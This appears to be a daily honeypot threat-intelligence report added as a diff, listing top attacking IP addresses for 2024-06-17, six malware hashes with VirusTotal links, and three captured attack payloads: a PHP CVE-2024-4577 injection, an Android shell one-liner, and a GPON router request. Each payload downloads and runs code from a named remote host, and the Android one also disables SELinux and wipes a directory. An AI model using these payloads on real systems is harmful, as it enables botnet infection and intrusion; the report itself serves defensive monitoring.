@@ -1,0 +1,45 @@
+Top 5 IPs for 2024-06-17 :
+
+158.51.126.147
+81.222.177.112
+112.5.6.69
+43.134.63.221
+125.124.121.134
+
+Malware Observed:
+
+76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+
+1db1583bb4154934d467dd1522a3c03fb776ca94e73250db0e0c978079e5a481
+https://www.virustotal.com/gui/file/1db1583bb4154934d467dd1522a3c03fb776ca94e73250db0e0c978079e5a481
+
+fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+https://www.virustotal.com/gui/file/fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+
+
+Commands/exploits observed:
+
+
+<?php shell_exec("SC=$(wget -O- http://185.172.128.93/sh || curl http://185.172.128.93/sh); echo \\"\\$SC\\" | sh -s cve_2024_4577"); echo(md5("Hello CVE-2024-4577")); ?>
+
+
+su 0 kill -9 $(toybox ps -eo pid,%cpu,cmd --sort=-%cpu | awk 'NR>1 && $3 !~ /^(surfaceflinger|system_server)/ && $2 > 15 && $1 != '$$' {print $1}');kill -9 $(toybox ps -eo pid,%cpu,cmd --sort=-%cpu | awk 'NR>1 && $3 !~ /^(surfaceflinger|system_server)/ && $2 > 20 && $1 != '$$' {print $1}');toybox pkill M;toybox pkill -9 arm;toybox pkill -9 arm7;toybox pkill -9 x86;toybox pkill -9 x86_64;su 0 toybox pkill M;su 0 toybox pkill -9 arm;su 0 toybox pkill -9 arm7;su 0 toybox pkill -9 x86;su 0 toybox pkill -9 x86_64;su 0 rm -rf /data/local;su 0 mkdir /data/local/;su 0 mkdir /data/local/tmp;su 0 chmod 777 /data/local;su 0 chmod 777 /data/local/tmp;chmod 777 /data/local/tmp; cd /data/local/tmp || cd /data/local/.most || cd /data/local/most; rm -rf *;setenforce 0;busybox wget http://103.176.25.223/and || su 0 busybox wget http://103.176.25.223/and;chmod 777 and || su 0 chmod 777 and;sh and;su 0 mv /data/local/tmp /data/local/.most;su 0 chmod 777 /data/local;su 0 echo hacker > /data/local/tmp;su 0 chmod 444 /data/local;ulimit 999999
+
+
+POST /GponForm/diag_Form?images/ HTTP/1.1
+User-Agent: Hello, World
+Accept: */*
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+
+XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://213.232.235.166/mips;chmod+777+mips;./mips+gpon.selfrep`&ipv=0
